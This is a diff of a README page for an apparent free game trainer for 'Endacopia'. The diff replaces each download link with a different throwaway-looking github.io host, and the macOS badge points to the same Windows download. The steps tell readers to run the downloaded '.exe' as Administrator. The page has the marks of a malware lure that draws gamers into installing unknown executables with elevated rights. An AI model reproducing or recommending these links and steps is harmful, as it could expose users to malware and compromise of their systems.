@@ -2,9 +2,9 @@
 
 Endacopia trainer: god mode, infinite stamina — free trainer, no key.
 
-[![Download](https://img.shields.io/badge/Download-Trainer-blue?style=for-the-badge)](https://phantommofence.github.io/download-win/)
-[![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://phantommofence.github.io/download-win/)
-[![macOS](https://img.shields.io/badge/macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://phantommofence.github.io/download-win/)
+[![Download](https://img.shields.io/badge/Download-Trainer-blue?style=for-the-badge)](https://beatowlrouse.github.io/windownload/)
+[![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://beatowlrouse.github.io/windownload/)
+[![macOS](https://img.shields.io/badge/macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beatowlrouse.github.io/windownload/)
 
 ---
 
@@ -31,7 +31,7 @@ Endacopia stays in the top trainer searches — god mode, infinite stamina domin
 
 ### 🪟 Windows
 
-1. Download the latest build 👉 [Download Trainer](https://phantommofence.github.io/download-win/)
+1. Download the latest build 👉 [Download Trainer](https://beatowlrouse.github.io/windownload/)
 2. Extract and run the `.exe` as Administrator.
 3. Launch Endacopia and load your save.
 4. Press **F1** to open the menu — toggle what you need. Done ✅
